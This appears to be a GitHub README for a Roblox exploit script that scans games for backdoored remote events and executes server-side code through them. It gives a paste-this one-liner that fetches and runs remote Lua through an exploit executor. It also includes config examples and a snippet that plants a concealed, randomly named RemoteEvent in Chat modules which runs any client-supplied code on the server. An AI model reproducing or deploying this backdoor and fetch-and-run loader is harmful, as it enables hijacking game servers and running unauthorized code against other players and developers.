# backdoor-executor.lua
(pls help me get a new name for this script)
might be better than [backdoor.exe](https://github.com/iK4oS/backdoor.exe) in terms of scanning.

## Info
This script is for [Roblox](https://roblox.com) scanning backdoors and executing serversided scripts within a gui.
### Script
Just copy the script below and execute it through your executor.
```lua
loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/jLn0n/created-scripts-public/main/backdoor-executor/backdoor-executor.lua"))()
```
### Requirements
- A brain that can read this stuffs
- Decent executor that supports filesystem functions (for config)
### Authors
**jLn0n**
- Discord: jLn0n#1464(474555624219344906)
- Github: [@jLn0n](https://github.com/jLn0n)
- Guilded: [jLn0n](https://www.guilded.gg/profile/1Ar9EYwm)
### Config Help
- My config has reset back to original
> The config will reset to the original config if the config version(configVer in [bexe-config.lua](https://github.com/jLn0n/created-scripts-public/blob/main/backdoor-executor/bexe-config.lua)) is lower than the original config so you should always backup your config to prevent config resets
- Adding cache example
```lua
[placeid] = {
	["Path"] = "remote.path.here", -- this is the path of the remote, don't do remote.path["here"] or it will not work
	["Args"] = {"arg1here", "source"}, -- source shouldn't be deleted because its a arg for scripts that will be executed
	["Func"] = function(source) -- use this if a game has a custom encryption for source
		return source
	end
}
```
> if the cache didn't work backdoor-executor.lua will warn u that the cache is outdated
- Using autoexecute
> add a script inside the autoExecute table, you can put many code as long as you want inside the table, example:
```lua
-- it should be a array and don't add a nil or it will not work
{
	[[print("jLn0n is epic!")]],
	[[warn("backdoor-executor.lua needs a new name!")]]
},
```
- blacklisting events
> it should be just like adding scripts on autoexecute, example:
```lua
{
	["eventNames"] = {
		["blacklistedNameHere"] = true
	},
	["eventParentNames"] = {
		["blacklistedParentName"] = true
	}
},
```

## Adding a backdoor in your game
Get access to a game in Roblox Studio, create a script and paste the few lines of code below in the script.
Make sure to enable `Loadstring` in `ServerScriptService`. (credits to [backdoor.exe](https://github.com/iK4oS/backdoor.exe) for me copying this thingy(and modifying it).)
```lua
local Remote = Instance.new("RemoteEvent")
Remote.Name = tostring(math.random(1, 99999999))
Remote.Parent = game:GetService("Chat"):WaitForChild("ClientChatModules").MessageCreatorModules
Remote.OnServerEvent:Connect(function(player, source)
	loadstring(source)()
end)
```
